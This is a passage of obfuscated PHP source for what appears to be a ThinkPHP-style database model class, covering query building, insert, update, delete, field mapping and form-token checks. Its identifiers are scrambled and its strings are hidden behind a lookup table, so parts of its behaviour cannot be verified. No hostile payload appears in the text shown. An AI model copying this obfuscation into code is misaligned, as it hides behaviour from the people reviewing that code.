$options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\157\x72\144\x65\x72", "\x61\x6c\x69\141\163", "\x68\141\x76\x69\x6e\147", "\x67\162\x6f\165\x70", "\x6c\x6f\143\153", "\144\151\x73\164\151\x6e\x63\164", "\141\x75\164\157", "\146\x69\x6c\x74\x65\162", "\x76\141\154\x69\144\141\x74\145", "\x72\145\163\x75\x6c\x74", "\142\151\x6e\144", "\164\x6f\x6b\x65\x6e"); public function __construct($Ì ë‡»· = '', $ åÆÔæß = '', $¶“ä‹‚ = '') { $”ãô÷İİ =& $_SERVER[Õò”†—·]; $this->_initialize(); if (!empty($Ì ë‡»·)) { if (strpos($Ì ë‡»·, $”ãô÷İİ[20])) { list($this->dbName, $this->name) = explode($”ãô÷İİ[20], $Ì ë‡»·); } else { $this->name = $Ì ë‡»·; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ åÆÔæß)) { $this->tablePrefix = $”ãô÷İİ[22]; } elseif ($”ãô÷İİ[22] != $ åÆÔæß) { $this->tablePrefix = $ åÆÔæß; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($”ãô÷İİ[305]); } $this->db(0, empty($this->connection) ? $¶“ä‹‚ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $éëšÉò³ =& $_SERVER[Õò”†—·]; if (empty($this->fields)) { if (think_config($éëšÉò³[306])) { $é¡¿¼™¤ = $this->dbName ? $this->dbName : think_config($éëšÉò³[307]); $¤¹¥ËßĞ = think_var_cache($éëšÉò³[308] . strtolower(get_path_this($é¡¿¼™¤) . $éëšÉò³[20] . $this->name)); if ($¤¹¥ËßĞ) { $éîÊìì = think_config($éëšÉò³[309]); if (empty($éîÊìì) || $¤¹¥ËßĞ[$éëšÉò³[310]] == $éîÊìì) { $this->fields = $¤¹¥ËßĞ; return; } } } $this->flush(); } } public function flush() { $ªœÙ‡áœ =& $_SERVER[Õò”†—·]; $this->db->setModel($this->name); $ğ·¶Á = $this->db->getFields($this->getTableName()); if (!$ğ·¶Á) { return !1; } $this->fields = array_keys($ğ·¶Á); $this->fields[$ªœÙ‡áœ[311]] = !1; foreach ($ğ·¶Á as $‚Ë³Ôï => $µ•—ğ°¹) { $‡¸¾ÊÂå[$‚Ë³Ôï] = $µ•—ğ°¹[$ªœÙ‡áœ[43]]; if ($µ•—ğ°¹[$ªœÙ‡áœ[49]]) { $this->fields[$ªœÙ‡áœ[312]] = $‚Ë³Ôï; if ($µ•—ğ°¹[$ªœÙ‡áœ[52]]) { $this->fields[$ªœÙ‡áœ[311]] = !0; } } } $this->fields[$ªœÙ‡áœ[313]] = $‡¸¾ÊÂå; if (think_config($ªœÙ‡áœ[309])) { $this->fields[$ªœÙ‡áœ[310]] = think_config($ªœÙ‡áœ[309]); } if (think_config($ªœÙ‡áœ[306])) { $ïˆûóåô = $this->dbName ? $this->dbName : think_config($ªœÙ‡áœ[307]); think_var_cache($ªœÙ‡áœ[308] . strtolower(get_path_this($ïˆûóåô) . $ªœÙ‡áœ[20] . $this->name), $this->fields); } } public function switchModel($®ƒÃ¤­Ğ, $ÊœªÉÛü = array()) { $±ší«é° =& $_SERVER[Õò”†—·]; $¦¢æóç° = ucwords(strtolower($®ƒÃ¤­Ğ)) . $±ší«é°[314]; if (!class_exists($¦¢æóç°)) { think_exception($¦¢æóç° . think_lang($±ší«é°[315])); } $this->_extModel = new $¦¢æóç°($this->name); if (!empty($ÊœªÉÛü)) { foreach ($ÊœªÉÛü as $ûöÈŸÀƒ) { $this->_extModel->setProperty($ûöÈŸÀƒ, $this->{$ûöÈŸÀƒ}); } } return $this->_extModel; } public function __set($ ªì”„ì, $ôÆÚ‡ù±) { $this->data[$ ªì”„ì] = $ôÆÚ‡ù±; } public function __get($¡ÛŒ§®õ) { return isset($this->data[$¡ÛŒ§®õ]) ? $this->data[$¡ÛŒ§®õ] : null; } public function __isset($ÀÌ£‘Œ—) { return isset($this->data[$ÀÌ£‘Œ—]); } public function __unset($ìã‘ú›’) { unset($this->data[$ìã‘ú›’]); } public function __call($ÉŸÙ¢ò, $‡çª¥Ø€) { $ÑÀ´­ˆº =& $_SERVER[Õò”†—·]; if (in_array(strtolower($ÉŸÙ¢ò), $this->methods, !0)) { $this->options[strtolower($ÉŸÙ¢ò)] = $‡çª¥Ø€[0]; return $this; } elseif (in_array(strtolower($ÉŸÙ¢ò), array($ÑÀ´­ˆº[316], $ÑÀ´­ˆº[317], $ÑÀ´­ˆº[318], $ÑÀ´­ˆº[319], $ÑÀ´­ˆº[320]), !0)) { $şñ™ô‹ß = isset($‡çª¥Ø€[0]) ? $‡çª¥Ø€[0] : $ÑÀ´­ˆº[221]; $şñ™ô‹ß = $this->db->parseKey($şñ™ô‹ß); return $this->getField(strtoupper($ÉŸÙ¢ò) . $ÑÀ´­ˆº[321] . $şñ™ô‹ß . $ÑÀ´­ˆº[322] . $ÉŸÙ¢ò, $ÑÀ´­ˆº[316]); } elseif (strtolower(substr($ÉŸÙ¢ò, 0, 5)) == $ÑÀ´­ˆº[323]) { $şñ™ô‹ß = think_parse_name(substr($ÉŸÙ¢ò, 5)); $Ï××±Ô[$şñ™ô‹ß] = $‡çª¥Ø€[0]; return $this->where($Ï××±Ô)->find(); } elseif (strtolower(substr($ÉŸÙ¢ò, 0, 10)) == $ÑÀ´­ˆº[324]) { $¼ıç¶ñä = think_parse_name(substr($ÉŸÙ¢ò, 10)); $Ï××±Ô[$¼ıç¶ñä] = $‡çª¥Ø€[0]; return $this->where($Ï××±Ô)->getField($‡çª¥Ø€[1]); } elseif (isset($this->_scope[$ÉŸÙ¢ò])) { return $this->scope($ÉŸÙ¢ò, $‡çª¥Ø€[0]); } elseif (method_exists($this, $ÉŸÙ¢ò)) { array_unshift($‡çª¥Ø€, $ÉŸÙ¢ò); return call_user_func_array(array($this, $ÑÀ´­ˆº[325]), $‡çª¥Ø€); } else { return call_user_func_array(array(parent, $ÉŸÙ¢ò), $‡çª¥Ø€); } } protected function call() { $¥­Ïúø€ =& $_SERVER[Õò”†—·]; $¤ş¬…õ§ = func_get_args(); $ş×öĞ“ = array_shift($¤ş¬…õ§); $ƒ×¾¸äú = $ş×öĞ“; if (is_array($ş×öĞ“)) { $ƒ×¾¸äú = $ş×öĞ“[1]; $ş×öĞ“ = $ş×öĞ“[0]; } $ÔóñÁ·Ä = count($¤ş¬…õ§) - 1; if (isset($¤ş¬…õ§[$ÔóñÁ·Ä]) && $¤ş¬…õ§[$ÔóñÁ·Ä] === $ş×öĞ“) { think_exception(__CLASS__ . $¥­Ïúø€[4] . $ş×öĞ“ . think_lang($¥­Ïúø€[326])); return; } $¤ş¬…õ§[] = $ş×öĞ“; if (method_exists($this, $¥­Ïúø€[327])) { $ÛûªÅ‚ = call_user_func_array(array($this, $¥­Ïúø€[328]), array($ƒ×¾¸äú, $¤ş¬…õ§)); if (!is_null($ÛûªÅ‚) && $ÛûªÅ‚ !== !1) { return $ÛûªÅ‚; } } $ÙİõÉ–§ = call_user_func_array(array($this, $ş×öĞ“), $¤ş¬…õ§); if (method_exists($this, $¥­Ïúø€[329])) { $ÛûªÅ‚ = call_user_func_array(array($this, $¥­Ïúø€[330]), array($ƒ×¾¸äú, $¤ş¬…õ§, $ÙİõÉ–§)); if ($ÛûªÅ‚) { return $ÛûªÅ‚; } } return $ÙİõÉ–§; } protected function _initialize() { } protected function _facade($³ÜŠÇÆó) { $Û€¹Ÿ =& $_SERVER[Õò”†—·]; if (!empty($this->fields)) { foreach ($³ÜŠÇÆó as $÷¤˜³µã => $§˜îÅÒµ) { if (is_array($this->fields) && !in_array($÷¤˜³µã, $this->fields, !0)) { unset($³ÜŠÇÆó[$÷¤˜³µã]); } elseif (is_scalar($§˜îÅÒµ)) { $this->_parseType($³ÜŠÇÆó, $÷¤˜³µã); } } } if (!empty($this->options[$Û€¹Ÿ[331]])) { $³ÜŠÇÆó = array_map($this->options[$Û€¹Ÿ[331]], $³ÜŠÇÆó); unset($this->options[$Û€¹Ÿ[331]]); } $this->_beforeWrite($³ÜŠÇÆó); return $³ÜŠÇÆó; } protected function _beforeWrite(&$âñ˜³¯Å) { } public function add($—ıØÃŞö = '', $¹ºÃ†è = array(), $æ·Âóó = false) { if (empty($—ıØÃŞö)) { if (!empty($this->data)) { $—ıØÃŞö = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Õò”†—·][332]); return !1; } } $¹ºÃ†è = $this->_parseOptions($¹ºÃ†è); $—ıØÃŞö = $this->_facade($—ıØÃŞö); if (!1 === $this->_beforeInsert($—ıØÃŞö, $¹ºÃ†è)) { return !1; } $Ÿî¾“í = $this->db->insert($—ıØÃŞö, $¹ºÃ†è, $æ·Âóó); if (!1 !== $Ÿî¾“í) { $ˆÕÅ¯§é = $this->getLastInsID(); if ($ˆÕÅ¯§é) { $—ıØÃŞö[$this->getPk()] = $ˆÕÅ¯§é; $this->_after_insert($—ıØÃŞö, $¹ºÃ†è); return $ˆÕÅ¯§é; } $this->_after_insert($—ıØÃŞö, $¹ºÃ†è); } return $Ÿî¾“í; } protected function _beforeInsert(&$ÊøŠú„¾, $Ãî“Ùİ¿) { } protected function _after_insert($ÙË—Êùû, $¥ÏŞŞã‰) { } public function addAll($ü‰ªüâ–, $å³± ’” = array(), $˜ÓÍ” = false) { $¤Œƒß™‚ =& $_SERVER[Õò”†—·]; if (empty($ü‰ªüâ–)) { $this->error = think_lang($¤Œƒß™‚[332]); return !1; } $å³± ’” = $this->_parseOptions($å³± ’”); foreach ($ü‰ªüâ– as $Ö¡ô†´ => $êÈ‰ıËÓ) { $ü‰ªüâ–[$Ö¡ô†´] = $this->_facade($êÈ‰ıËÓ); } if (method_exists($this->db, $¤Œƒß™‚[333])) { $¥Ú¨éôê = $this->db->insertAll($ü‰ªüâ–, $å³± ’”, $˜ÓÍ”); } else { $this->startTrans(); foreach ($ü‰ªüâ– as $Ö¡ô†´ => $êÈ‰ıËÓ) { $¥Ú¨éôê = $this->db->insert($êÈ‰ıËÓ, $å³± ’”, $˜ÓÍ”); } $this->commit(); } if (!1 !== $¥Ú¨éôê) { $‰„Ÿ—Ê = $this->getLastInsID(); if ($‰„Ÿ—Ê) { return $‰„Ÿ—Ê; } } return $¥Ú¨éôê; } public function selectAdd($Å…œ¯íÕ = '', $•éÏø•ı = '', $²å¡ğÉ = array()) { $ã„Ï×¨Ô =& $_SERVER[Õò”†—·]; $²å¡ğÉ = $this->_parseOptions($²å¡ğÉ); if (!1 === ($œŠÅÖ = $this->db->selectInsert($Å…œ¯íÕ ? $Å…œ¯íÕ : $²å¡ğÉ[$ã„Ï×¨Ô[334]], $•éÏø•ı ? $•éÏø•ı : $this->getTableName(), $²å¡ğÉ))) { $this->error = think_lang($ã„Ï×¨Ô[335]); return !1; } else { return $œŠÅÖ; } } public function save($”Œò´å¡ = '', $Å¼³¦îÃ = array()) { $®²ìÂÜü =& $_SERVER[Õò”†—·]; if (empty($”Œò´å¡)) { if (!empty($this->data)) { $”Œò´å¡ = $this->data; $this->data = array(); } else { $this->error = think_lang($®²ìÂÜü[332]); return !1; } } $”Œò´å¡ = $this->_facade($”Œò´å¡); $Å¼³¦îÃ = $this->_parseOptions($Å¼³¦îÃ); $‘èÜ›è˜ = $this->getPk(); if (!isset($Å¼³¦îÃ[$®²ìÂÜü[336]])) { if (isset($”Œò´å¡[$‘èÜ›è˜])) { $ŠõâÉùà[$‘èÜ›è˜] = $”Œò´å¡[$‘èÜ›è˜]; $Å¼³¦îÃ[$®²ìÂÜü[336]] = $ŠõâÉùà; unset($”Œò´å¡[$‘èÜ›è˜]); } else { $this->error = think_lang($®²ìÂÜü[335]); return !1; } } if (is_array($Å¼³¦îÃ[$®²ìÂÜü[336]]) && isset($Å¼³¦îÃ[$®²ìÂÜü[336]][$‘èÜ›è˜])) { $ñÔÂƒ„× = $Å¼³¦îÃ[$®²ìÂÜü[336]][$‘èÜ›è˜]; } if (!1 === $this->_beforeUpdate($”Œò´å¡, $Å¼³¦îÃ)) { return !1; } $á£ö—î¤ = $this->db->update($”Œò´å¡, $Å¼³¦îÃ); if (!1 !== $á£ö—î¤) { if (isset($ñÔÂƒ„×)) { $”Œò´å¡[$‘èÜ›è˜] = $ñÔÂƒ„×; } $this->_afterUpdate($”Œò´å¡, $Å¼³¦îÃ); } return $á£ö—î¤; } protected function _beforeUpdate(&$ğÜÚ, $¿é‡Æº°) { } protected function _afterUpdate($¤„ùá½Ñ, $¢Äà¶¡) { } public function delete($½†ùÁ²ı = array()) { $ÍŸ‚ãÃÚ =& $_SERVER[Õò”†—·]; if (empty($½†ùÁ²ı) && empty($this->options[$ÍŸ‚ãÃÚ[336]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $×Ş™‘Á = $this->getPk(); if (is_numeric($½†ùÁ²ı) || is_string($½†ùÁ²ı)) { if (strpos($½†ùÁ²ı, $ÍŸ‚ãÃÚ[60])) { $ˆ•ŠÊ³û[$×Ş™‘Á] = array($ÍŸ‚ãÃÚ[337], $½†ùÁ²ı); } else { $ˆ•ŠÊ³û[$×Ş™‘Á] = $½†ùÁ²ı; } $this->options[$ÍŸ‚ãÃÚ[336]] = $ˆ•ŠÊ³û; } $½†ùÁ²ı = $this->_parseOptions(); if (is_array($½†ùÁ²ı[$ÍŸ‚ãÃÚ[336]]) && isset($½†ùÁ²ı[$ÍŸ‚ãÃÚ[336]][$×Ş™‘Á])) { $½éÏŸĞÂ = $½†ùÁ²ı[$ÍŸ‚ãÃÚ[336]][$×Ş™‘Á]; } $ÁÚíÛ· = $this->db->delete($½†ùÁ²ı); if (!1 !== $ÁÚíÛ·) { $¬¡İàŸ¥ = array(); if (isset($½éÏŸĞÂ)) { $¬¡İàŸ¥[$×Ş™‘Á] = $½éÏŸĞÂ; } $this->_after_delete($¬¡İàŸ¥, $½†ùÁ²ı); } return $ÁÚíÛ·; } protected function _after_delete($Ã¶Í×±«, $æ´â©òÇ) { } public function select($¬ÅàæŒÕ = array()) { $£ÊŒ¥ˆ =& $_SERVER[Õò”†—·]; if (is_string($¬ÅàæŒÕ) || is_numeric($¬ÅàæŒÕ)) { $à­ôû®³ = $this->getPk(); if (strpos($¬ÅàæŒÕ, $£ÊŒ¥ˆ[60])) { $ş„à‡ğã[$à­ôû®³] = array($£ÊŒ¥ˆ[337], $¬ÅàæŒÕ); } else { $ş„à‡ğã[$à­ôû®³] = $¬ÅàæŒÕ; } $this->options[$£ÊŒ¥ˆ[336]] = $ş„à‡ğã; } elseif (!1 === $¬ÅàæŒÕ) { $¬ÅàæŒÕ = $this->_parseOptions(); return $£ÊŒ¥ˆ[338] . $this->db->buildSelectSql($¬ÅàæŒÕ) . $£ÊŒ¥ˆ[339]; } $¬ÅàæŒÕ = $this->_parseOptions(); $Í÷Å‚©Ê = $this->db->select($¬ÅàæŒÕ); if (!1 === $Í÷Å‚©Ê) { return !1; } if (empty($Í÷Å‚©Ê)) { return null; } $this->_afterSelect($Í÷Å‚©Ê, $¬ÅàæŒÕ); return $Í÷Å‚©Ê; } protected function _afterSelect(&$·Ò‘ú¸‘, $‹üƒÒÊ) { } public function buildSql($İÍñÈíò = array()) { $½Œî¹ñ =& $_SERVER[Õò”†—·]; $İÍñÈíò = $this->_parseOptions($İÍñÈíò); return $½Œî¹ñ[338] . $this->db->buildSelectSql($İÍñÈíò) . $½Œî¹ñ[339]; } public function optionsValue($ûü¡ğù– = null) { if (is_null($ûü¡ğù–)) { return $this->options; } elseif (is_array($ûü¡ğù–)) { $this->options = array_merge($this->options, $ûü¡ğù–); } } protected function _parseOptions($šãí¢ = array()) { $ˆÓï«Ş‘ =& $_SERVER[Õò”†—·]; if (is_array($šãí¢)) { $šãí¢ = array_merge($this->options, $šãí¢); } $this->options = array(); if (!isset($šãí¢[$ˆÓï«Ş‘[340]])) { $šãí¢[$ˆÓï«Ş‘[340]] = $this->getTableName(); $€’ÁÀ®ú = $this->fields; } else { $€’ÁÀ®ú = $this->getDbFields(); } if (!empty($šãí¢[$ˆÓï«Ş‘[341]])) { $šãí¢[$ˆÓï«Ş‘[340]] .= $ˆÓï«Ş‘[63] . $šãí¢[$ˆÓï«Ş‘[341]]; } $šãí¢[$ˆÓï«Ş‘[342]] = $this->name; if (isset($šãí¢[$ˆÓï«Ş‘[336]]) && is_array($šãí¢[$ˆÓï«Ş‘[336]]) && !empty($€’ÁÀ®ú) && !isset($šãí¢[$ˆÓï«Ş‘[343]]) && !isset($šãí¢[$ˆÓï«Ş‘[340]])) { foreach ($šãí¢[$ˆÓï«Ş‘[336]] as $¾­ÀÆ©• => $Ç ‡€) { $¾­ÀÆ©• = trim($¾­ÀÆ©•); if (in_array($¾­ÀÆ©•, $€’ÁÀ®ú, !0)) { if (is_scalar($Ç ‡€)) { $this->_parseType($šãí¢[$ˆÓï«Ş‘[336]], $¾­ÀÆ©•); } } elseif (!is_numeric($¾­ÀÆ©•) && $ˆÓï«Ş‘[21] != substr($¾­ÀÆ©•, 0, 1) && !1 === strpos($¾­ÀÆ©•, $ˆÓï«Ş‘[20]) && !1 === strpos($¾­ÀÆ©•, $ˆÓï«Ş‘[321]) && !1 === strpos($¾­ÀÆ©•, $ˆÓï«Ş‘[215]) && !1 === strpos($¾­ÀÆ©•, $ˆÓï«Ş‘[344])) { unset($šãí¢[$ˆÓï«Ş‘[336]][$¾­ÀÆ©•]); } } } $this->_options_filter($šãí¢); return $šãí¢; } protected function _options_filter(&$£Î·€‚ê) { } protected function _parseType(&$áõüÌ¥ñ, $’ƒŠñÇÓ) { $‰ÄúšË— =& $_SERVER[Õò”†—·]; if (empty($this->options[$‰ÄúšË—[345]][$‰ÄúšË—[4] . $’ƒŠñÇÓ])) { $ÏóàŸ‚¢ = strtolower($this->fields[$‰ÄúšË—[313]][$’ƒŠñÇÓ]); if (!1 !== strpos($ÏóàŸ‚¢, $‰ÄúšË—[346])) { } elseif (!1 === strpos($ÏóàŸ‚¢, $‰ÄúšË—[347]) && !1 !== strpos($ÏóàŸ‚¢, $‰ÄúšË—[348])) { $áõüÌ¥ñ[$’ƒŠñÇÓ] = intval($áõüÌ¥ñ[$’ƒŠñÇÓ]); } elseif (!1 !== strpos($ÏóàŸ‚¢, $‰ÄúšË—[349]) || !1 !== strpos($ÏóàŸ‚¢, $‰ÄúšË—[350])) { $áõüÌ¥ñ[$’ƒŠñÇÓ] = floatval($áõüÌ¥ñ[$’ƒŠñÇÓ]); } elseif (!1 !== strpos($ÏóàŸ‚¢, $‰ÄúšË—[351])) { $áõüÌ¥ñ[$’ƒŠñÇÓ] = (bool) $áõüÌ¥ñ[$’ƒŠñÇÓ]; } } } public function find($€œ©»¤ = array()) { $¤†æ©Âô =& $_SERVER[Õò”†—·]; if (is_numeric($€œ©»¤) || is_string($€œ©»¤)) { $Ö–ƒšË²[$this->getPk()] = intval($€œ©»¤); $this->options[$¤†æ©Âô[336]] = $Ö–ƒšË²; } $this->options[$¤†æ©Âô[352]] = 1; $€œ©»¤ = $this->_parseOptions(); $û°èßí° = $this->db->select($€œ©»¤); if (!1 === $û°èßí°) { return !1; } if (empty($û°èßí°)) { return null; } $this->data = $û°èßí°[0]; $this->_afterFind($this->data, $€œ©»¤); if (!empty($this->options[$¤†æ©Âô[353]])) { return $this->returnResult($this->data, $this->options[$¤†æ©Âô[353]]); } return $this->data; } protected function _afterFind(&$ÜÑõïİò, $ıçşÚ ) { } protected function returnResult($²•Ã¨Ôì, $àÂÏ„º = '') { $È¶ö›ÙÜ =& $_SERVER[Õò”†—·]; if ($àÂÏ„º) { if (is_callable($àÂÏ„º)) { return call_user_func($àÂÏ„º, $²•Ã¨Ôì); } switch (strtolower($àÂÏ„º)) { case $È¶ö›ÙÜ[354]: return json_encode($²•Ã¨Ôì); case $È¶ö›ÙÜ[355]: return xml_encode($²•Ã¨Ôì); } } return $²•Ã¨Ôì; } public function parseFieldsMap($Ñõú§Ü‘, $¡›”ñ‡ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÍËäÙûÓ => $±õ»ƒ€ı) { if ($¡›”ñ‡ == 1) { if (isset($Ñõú§Ü‘[$±õ»ƒ€ı])) { $Ñõú§Ü‘[$ÍËäÙûÓ] = $Ñõú§Ü‘[$±õ»ƒ€ı]; unset($Ñõú§Ü‘[$±õ»ƒ€ı]); } } else { if (isset($Ñõú§Ü‘[$ÍËäÙûÓ])) { $Ñõú§Ü‘[$±õ»ƒ€ı] = $Ñõú§Ü‘[$ÍËäÙûÓ]; unset($Ñõú§Ü‘[$ÍËäÙûÓ]); } } } } return $Ñõú§Ü‘; } public function setField($‡áº¥€, $Ğû”àŸ = '') { if (is_array($‡áº¥€)) { $›ãˆ¦ = $‡áº¥€; } else { $›ãˆ¦[$‡áº¥€] = $Ğû”àŸ; } return $this->save($›ãˆ¦); } public function setAdd($Òè‹Û·, $û…ÇºÉÙ = 1) { $€Ê¬Î«Ÿ =& $_SERVER[Õò”†—·]; $¬€ÙëÍ¸ = $Òè‹Û· . $€Ê¬Î«Ÿ[356] . $û…ÇºÉÙ; if ($û…ÇºÉÙ < 0) { $¬€ÙëÍ¸ = $Òè‹Û· . $û…ÇºÉÙ; } return $this->setField($Òè‹Û·, array($€Ê¬Î«Ÿ[357], $¬€ÙëÍ¸)); } public function getField($¯ûà ¨â, $è Íœ· = null) { $¸ë˜Ëîú =& $_SERVER[Õò”†—·]; $â’Æ¸¹[$¸ë˜Ëîú[334]] = $¯ûà ¨â; $â’Æ¸¹ = $this->_parseOptions($â’Æ¸¹); $¯ûà ¨â = trim($¯ûà ¨â); if (strpos($¯ûà ¨â, $¸ë˜Ëîú[60])) { if (!isset($â’Æ¸¹[$¸ë˜Ëîú[352]])) { $â’Æ¸¹[$¸ë˜Ëîú[352]] = is_numeric($è Íœ·) ? $è Íœ· : $¸ë˜Ëîú[22]; } $Øèé´±¸ = $this->db->select($â’Æ¸¹); if (!empty($Øèé´±¸)) { $Éù‰¹¹¦ = explode($¸ë˜Ëîú[60], $¯ûà ¨â); $¯ûà ¨â = array_keys($Øèé´±¸[0]); $‘ğÅœé = array_shift($¯ûà ¨â); $êØø‘Â‚ = array_shift($¯ûà ¨â); $´€Å¥‡ş = array(); $ãËŠÍßÄ = count($Éù‰¹¹¦); foreach ($Øèé´±¸ as $Í‚êÇª) { $ï©Åú¯Ú = $Í‚êÇª[$‘ğÅœé]; if (2 == $ãËŠÍßÄ) { $´€Å¥‡ş[$ï©Åú¯Ú] = $Í‚êÇª[$êØø‘Â‚]; } else { $´€Å¥‡ş[$ï©Åú¯Ú] = is_string($è Íœ·) ? implode($è Íœ·, $Í‚êÇª) : $Í‚êÇª; } } return $´€Å¥‡ş; } } else { if (!0 !== $è Íœ·) { $â’Æ¸¹[$¸ë˜Ëîú[352]] = is_numeric($è Íœ·) ? $è Íœ· : 1; } if ($è Íœ· === $¸ë˜Ëîú[316]) { unset($â’Æ¸¹[$¸ë˜Ëîú[352]]); } $Í‚êÇª = $this->db->select($â’Æ¸¹); if (!empty($Í‚êÇª)) { if ($è Íœ· === $¸ë˜Ëîú[316]) { return reset($Í‚êÇª[0]); } if (!0 !== $è Íœ· && 1 == $â’Æ¸¹[$¸ë˜Ëîú[352]]) { return reset($Í‚êÇª[0]); } foreach ($Í‚êÇª as $ÚÁ¼¹ÆÕ) { $Åëøöƒ›[] = $ÚÁ¼¹ÆÕ[$¯ûà ¨â]; } return $Åëøöƒ›; } } return null; } public function create($ã¯“ı¼½ = '', $ÖÕ«ÂË‘ = '') { $¶Á©­…ø =& $_SERVER[Õò”†—·]; if (empty($ã¯“ı¼½)) { $ã¯“ı¼½ = $_POST; } elseif (is_object($ã¯“ı¼½)) { $ã¯“ı¼½ = get_object_vars($ã¯“ı¼½); } if (empty($ã¯“ı¼½) || !is_array($ã¯“ı¼½)) { $this->error = think_lang($¶Á©­…ø[332]); return !1; } $ã¯“ı¼½ = $this->parseFieldsMap($ã¯“ı¼½, 0); $ÖÕ«ÂË‘ = $ÖÕ«ÂË‘ ? $ÖÕ«ÂË‘ : (!empty($ã¯“ı¼½[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¶Á©­…ø[334]])) { $¸Ñµ²£Ù = $this->options[$¶Á©­…ø[334]]; unset($this->options[$¶Á©­…ø[334]]); } elseif ($ÖÕ«ÂË‘ == THINK_MODEL_INSERT && isset($this->insertFields)) { $¸Ñµ²£Ù = $this->insertFields; } elseif ($ÖÕ«ÂË‘ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¸Ñµ²£Ù = $this->updateFields; } if (isset($¸Ñµ²£Ù)) { if (is_string($¸Ñµ²£Ù)) { $¸Ñµ²£Ù = explode($¶Á©­…ø[60], $¸Ñµ²£Ù); } if (think_config($¶Á©­…ø[358])) { $¸Ñµ²£Ù[] = think_config($¶Á©­…ø[359]); } foreach ($ã¯“ı¼½ as $Èõ‘ŞÉ» => $ıÜàğ£—) { if (!in_array($Èõ‘ŞÉ», $¸Ñµ²£Ù)) { unset($ã¯“ı¼½[$Èõ‘ŞÉ»]); } } } if (!$this->autoValidation($ã¯“ı¼½, $ÖÕ«ÂË‘)) { return !1; } if (!$this->autoCheckToken($ã¯“ı¼½)) { $this->error = think_lang($¶Á©­…ø[360]); return !1; } if ($this->autoCheckFields) { $¸Ñµ²£Ù = $this->getDbFields(); foreach ($ã¯“ı¼½ as $Èõ‘ŞÉ» => $ıÜàğ£—) { if (!in_array($Èõ‘ŞÉ», $¸Ñµ²£Ù)) { unset($ã¯“ı¼½[$Èõ‘ŞÉ»]); } elseif (MAGIC_QUOTES_GPC && is_string($ıÜàğ£—)) { $ã¯“ı¼½[$Èõ‘ŞÉ»] = stripslashes($ıÜàğ£—); } } } $this->autoOperation($ã¯“ı¼½, $ÖÕ«ÂË‘); $this->data = $ã¯“ı¼½; return $ã¯“ı¼½; } public function autoCheckToken($Ì«ó³ûã) { $ü£Û’²” =& $_SERVER[Õò”†—·]; if (isset($this->options[$ü£Û’²”[361]]) && !$this->options[$ü£Û’²”[361]]) { return !0; } if (think_config($ü£Û’²”[358])) { $ÍÏâ”â· = think_config($ü£Û’²”[359]); if (!isset($Ì«ó³ûã[$ÍÏâ”â·]) || Session::get($ÍÏâ”â·)) { return !1; } list($£—Ëû, $×·õÙ¬¿) = explode($ü£Û’²”[21], $Ì«ó³ûã[$ÍÏâ”â·]); if ($×·õÙ¬¿ && Session::get($ÍÏâ”â· . $ü£Û’²”[20] . $£—Ëû) === $×·õÙ¬¿) { Session::remove($ÍÏâ”â· . $ü£Û’²”[20] . $£—Ëû); return !0; } if (think_config($ü£Û’²”[362])) { Session::remove($ÍÏâ”â· . $ü£Û’²”[20] . $£—Ëû); } return !1; } return !0; } public function regex($Î ¹ò², $˜–ëÙ°Ô) { $Ì£¿¥¼ =& $_SERVER[Õò”†—·]; $É¥³ã¦¿ = array($Ì£¿¥¼[363] => $Ì£¿¥¼[364], $Ì£¿¥¼[365] => $Ì£¿¥¼[366], $Ì£¿¥¼[367] => $Ì£¿¥¼[368], $Ì£¿¥¼[369] => $Ì£¿¥¼[370], $Ì£¿¥¼[371] => $Ì£¿¥¼[372], $Ì£¿¥¼[373] => $Ì£¿¥¼[374], $Ì£¿¥¼[375] => $Ì£¿¥¼[376], $Ì£¿¥¼[350] => $Ì£¿¥¼[377], $Ì£¿¥¼[378] => $Ì£¿¥¼[379]); if (isset($É¥³ã¦¿[strtolower($˜–ëÙ°Ô)])) { $˜–ëÙ°Ô = $É¥³ã¦¿[strtolower($˜–ëÙ°Ô)]; } return preg_match($˜–ëÙ°Ô, $Î ¹ò²) === 1; } private function autoOperation(&$€Ìâò¡Ì, $™¦Â®Ó) { $õÀ€ŒíĞ =& $_SERVER[Õò”†—·]; if (!empty($this->options[$õÀ€ŒíĞ[380]])) { $§û¢‡Çí = $this->options[$õÀ€ŒíĞ[380]]; unset($this->options[$õÀ€ŒíĞ[380]]); } elseif (!empty($this->_auto)) { $§û¢‡Çí = $this->_auto; } if (isset($§û¢‡Çí)) { foreach ($§û¢‡Çí as $ëÚÚÃŞ¼) { if (empty($ëÚÚÃŞ¼[2])) { $ëÚÚÃŞ¼[2] = THINK_MODEL_INSERT; } if ($™¦Â®Ó == $ëÚÚÃŞ¼[2] || $ëÚÚÃŞ¼[2] == THINK_MODEL_BOTH) { switch (trim($ëÚÚÃŞ¼[3])) { case $õÀ€ŒíĞ[381]: case $õÀ€ŒíĞ[382]: $Åìá’À = isset($ëÚÚÃŞ¼[4]) ? (array) $ëÚÚÃŞ¼[4] : array(); if (isset($€Ìâò¡Ì[$ëÚÚÃŞ¼[0]])) { array_unshift($Åìá’À, $€Ìâò¡Ì[$ëÚÚÃŞ¼[0]]); } if ($õÀ€ŒíĞ[381] == $ëÚÚÃŞ¼[3]) { $€Ìâò¡Ì[$ëÚÚÃŞ¼[0]] = call_user_func_array($ëÚÚÃŞ¼[1], $Åìá’À); } else { $€Ìâò¡Ì[$ëÚÚÃŞ¼[0]] = call_user_func_array(array(&$this, $ëÚÚÃŞ¼[1]), $Åìá’À); } break; case $õÀ€ŒíĞ[334]: $€Ìâò¡Ì[$ëÚÚÃŞ¼[0]] = $€Ìâò¡Ì[$ëÚÚÃŞ¼[1]]; break; case $õÀ€ŒíĞ[383]: if ($õÀ€ŒíĞ[22] === $€Ìâò¡Ì[$ëÚÚÃŞ¼[0]]) { unset($€Ìâò¡Ì[$ëÚÚÃŞ¼[0]]); } break; case 